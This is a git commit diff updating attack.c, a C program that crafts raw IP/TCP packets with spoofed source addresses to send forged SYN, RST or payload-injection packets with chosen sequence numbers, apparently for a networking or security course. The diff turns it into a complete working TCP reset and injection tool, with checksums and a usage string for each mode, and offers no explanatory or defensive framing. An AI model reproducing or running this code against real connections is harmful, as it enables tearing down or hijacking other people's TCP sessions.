59693076bb6f9ff75e87c94badd3c61be83a6b33
ahmeda110 <65793945+ahmeda110@users.noreply.github.com>
2025-11-18 12:34:48 -0700

    Update attack.c

--- attack.c
+++ attack.c
@@ -7,79 +7,137 @@
 #include <netinet/tcp.h>
 #include <sys/socket.h>
 
+struct pseudo_header {
+    uint32_t src;
+    uint32_t dst;
+    uint8_t zero;
+    uint8_t protocol;
+    uint16_t len;
+};
+
 unsigned short csum(unsigned short *buf, int nwords) {
     unsigned long sum = 0;
     while (nwords--) sum += *buf++;
-    while (sum >> 16) sum = (sum >> 16) + (sum & 0xffff);
+    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
     return (unsigned short)(~sum);
 }
 
-void build_packet(char *packet, char *src_ip, int src_port,
-                  char *dst_ip, int dst_port,
-                  unsigned int seq, unsigned int ack,
-                  char type, char *payload) {
+int main(int argc, char *argv[]) {
+    if (argc < 8) {
+        fprintf(stderr,
+          "Usage:\n"
+          "  SYN: sudo ./attack S <src_ip> <src_port> <dst_ip> <dst_port> <seq> <ack>\n"
+          "  RST: sudo ./attack R <src_ip> <src_port> <dst_ip> <dst_port> <seq> <ack>\n"
+          "  INJ: sudo ./attack D <src_ip> <src_port> <dst_ip> <dst_port> <seq> <ack> <payload>\n");
+        return 1;
+    }
 
-    struct iphdr *ip = (struct iphdr*)packet;
-    struct tcphdr *tcp = (struct tcphdr*)(packet + sizeof(struct iphdr));
-    int payload_len = payload ? strlen(payload) : 0;
+    char type      = argv[1][0];
+    char *src_ip   = argv[2];
+    int src_port   = atoi(argv[3]);
+    char *dst_ip   = argv[4];
+    int dst_port   = atoi(argv[5]);
+    uint32_t seq   = (uint32_t)strtoul(argv[6], NULL, 10);
+    uint32_t ack   = (uint32_t)strtoul(argv[7], NULL, 10);
+    char *payload  = (argc > 8) ? argv[8] : "";
+    int payload_len = (type == 'D') ? (int)strlen(payload) : 0;
 
-    memset(packet, 0, 4096);
+    char packet[4096];
+    memset(packet, 0, sizeof(packet));
 
-    // UTILIZED AI TO HELP ME WITH THIS PART: START
+    struct iphdr *ip = (struct iphdr *)packet;
+    struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));
+    char *data = (char *)(packet + sizeof(struct iphdr) + sizeof(struct tcphdr));
+
+    if (payload_len > 0) {
+        memcpy(data, payload, payload_len);
+    }
+
+    // IP header
     ip->ihl = 5;
     ip->version = 4;
+    ip->tos = 0;
+    ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_len);
+    ip->id = htons(54321);
+    ip->frag_off = 0;
     ip->ttl = 64;
     ip->protocol = IPPROTO_TCP;
     ip->saddr = inet_addr(src_ip);
     ip->daddr = inet_addr(dst_ip);
-    ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_len);
-    ip->check = csum((unsigned short*)ip, 10);
+    ip->check = 0;
+    ip->check = csum((unsigned short *)ip, ip->ihl * 2);
 
+    // TCP header
     tcp->source = htons(src_port);
-    tcp->dest = htons(dst_port);
-    tcp->seq = htonl(seq);
-    tcp->ack_seq = htonl(ack);
-    tcp->doff = 5;
+    tcp->dest   = htons(dst_port);
+    tcp->seq    = htonl(seq);
+    tcp->ack_seq= htonl(ack);
+    tcp->doff   = 5;
     tcp->window = htons(65535);
+    tcp->urg_ptr= 0;
 
-    if (type == 'S') tcp->syn = 1;
-    if (type == 'R') tcp->rst = 1;
-    if (type == 'D') { tcp->psh = 1; tcp->ack = 1; }
+    // Flags
+    tcp->syn = 0;
+    tcp->rst = 0;
+    tcp->ack = 0;
+    tcp->psh = 0;
 
-    if (payload_len)
-        memcpy(packet + sizeof(struct iphdr) + sizeof(struct tcphdr), payload, payload_len);
+    if (type == 'S') {
+        tcp->syn = 1;
+    } else if (type == 'R') {
+        tcp->rst = 1;
+        tcp->ack = 1;  // RST+ACK is safer for an established connection
+    } else if (type == 'D') {
+        tcp->psh = 1;
+        tcp->ack = 1;
+    }
 
-    tcp->check = csum((unsigned short*)packet,
-                      (sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_len)/2);
-    //END
-}
+    // TCP checksum with pseudo-header
+    struct pseudo_header psh;
+    psh.src = ip->saddr;
+    psh.dst = ip->daddr;
+    psh.zero = 0;
+    psh.protocol = IPPROTO_TCP;
+    psh.len = htons(sizeof(struct tcphdr) + payload_len);
 
-int main(int argc, char *argv[]) {
-    char type = argv[1][0];
-    char *src_ip = argv[2];
-    int src_port = atoi(argv[3]);
-    char *dst_ip = argv[4];
-    int dst_port = atoi(argv[5]);
-    unsigned int seq = atoi(argv[6]);
-    unsigned int ack = atoi(argv[7]);
-    char *payload = (argc == 9 ? argv[8] : "");
+    int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + payload_len;
+    char *pseudogram = malloc(psize);
+    memcpy(pseudogram, &psh, sizeof(struct pseudo_header));
+    memcpy(pseudogram + sizeof(struct pseudo_header), tcp, sizeof(struct tcphdr) + payload_len);
 
-    char packet[4096];
-    build_packet(packet, src_ip, src_port, dst_ip, dst_port, seq, ack, type, payload);
+    tcp->check = 0;
+    tcp->check = csum((unsigned short *)pseudogram, psize / 2);
+    free(pseudogram);
 
     int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    if (s < 0) {
+        perror("socket");
+        return 1;
+    }
+
     int one = 1;
-    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
+    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
+        perror("setsockopt");
+        close(s);
+        return 1;
+    }
 
     struct sockaddr_in sin;
     sin.sin_family = AF_INET;
-    sin.sin_addr.s_addr = inet_addr(dst_ip);
+    sin.sin_port = tcp->dest;
+    sin.sin_addr.s_addr = ip->daddr;
 
-    sendto(s, packet, ntohs(((struct iphdr*)packet)->tot_len), 0,
-           (struct sockaddr*)&sin, sizeof(sin));
+    int packet_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_len;
 
-    printf("Sent %c packet from %s:%d to %s:%d\n",
-           type, src_ip, src_port, dst_ip, dst_port);
+    if (sendto(s, packet, packet_len, 0,
+               (struct sockaddr *)&sin, sizeof(sin)) < 0) {
+        perror("sendto");
+        close(s);
+        return 1;
+    }
+
+    printf("Sent %c from %s:%d to %s:%d, seq=%u ack=%u\n",
+           type, src_ip, src_port, dst_ip, dst_port, seq, ack);
 
     close(s);
     return 0;
